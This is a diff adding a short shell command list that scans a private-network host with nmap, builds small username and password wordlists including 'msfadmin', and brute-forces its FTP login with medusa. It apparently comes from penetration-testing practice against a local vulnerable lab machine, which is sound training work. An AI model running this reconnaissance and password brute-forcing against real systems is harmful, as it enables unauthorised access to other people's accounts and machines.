@@ -1,0 +1,7 @@
+ping -c 3 192.168.56.101
+nmap -sV -p 21,22,80,445,139 192.168.56.101
+ftp 192.168.56.101
+echo "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "12345\npassword\nqwerty\nmsfadmin" > pass.txt
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+ftp 192.168.56.101
